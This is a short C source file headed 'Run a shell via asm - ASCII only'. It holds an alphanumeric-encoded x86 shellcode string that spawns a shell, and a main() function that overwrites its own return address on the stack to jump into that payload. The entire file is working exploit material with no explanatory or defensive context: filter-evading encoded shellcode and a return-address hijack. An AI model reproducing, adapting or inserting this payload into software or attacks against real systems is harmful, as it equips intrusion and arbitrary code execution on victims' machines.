/*
 * Run a shell via asm - ASCII only.
 *
 */

char shellcode[] =
  "LLLLYhb0pLX5b0pLHSSPPWQPPaPWSUTBRDJfh5tDS"
  "RajYX0Dka0TkafhN9fYf1Lkb0TkdjfY0Lkf0Tkgfh"
  "6rfYf1Lki0tkkh95h8Y1LkmjpY0Lkq0tkrh2wnuX1"
  "Dks0tkwjfX0Dkx0tkx0tkyCjnY0LkzC0TkzCCjtX0"
  "DkzC0tkzCj3X0Dkz0TkzC0tkzChjG3IY1LkzCCCC0"
  "tkzChpfcMX1DkzCCCC0tkzCh4pCnY1Lkz1TkzCCCC"
  "fhJGfXf1Dkzf1tkzCCjHX0DkzCCCCjvY0LkzCCCjd"
  "X0DkzC0TkzCjWX0Dkz0TkzCjdX0DkzCjXY0Lkz0tk"
  "zMdgvvn9F1r8F55h8pG9wnuvjrNfrVx2LGkG3IDpf"
  "cM2KgmnJGgbinYshdvD9d";


int main(int argc, char *argv[])
{
  int *ret;

  printf("Length is %d\n",strlen(shellcode));
  ret = (int *)&ret + 2;
  (*ret) = (int)shellcode;
  return( 0 );
}
